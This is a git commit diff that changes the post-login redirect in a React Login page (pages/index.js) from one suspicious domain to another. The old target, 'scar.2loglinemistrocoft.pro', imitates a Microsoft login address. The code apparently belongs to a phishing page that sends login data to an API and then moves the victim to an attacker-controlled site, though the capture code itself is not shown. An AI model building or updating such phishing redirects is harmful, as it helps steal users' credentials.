371137cd8e33501231c58e1f34fa1f7bdddf9dd1
husknet <127146284+husknet@users.noreply.github.com>
2025-02-06 11:52:07 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://scar.2loglinemistrocoft.pro/';
+      window.location.href = 'https://scat.1tobyboint.mom/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
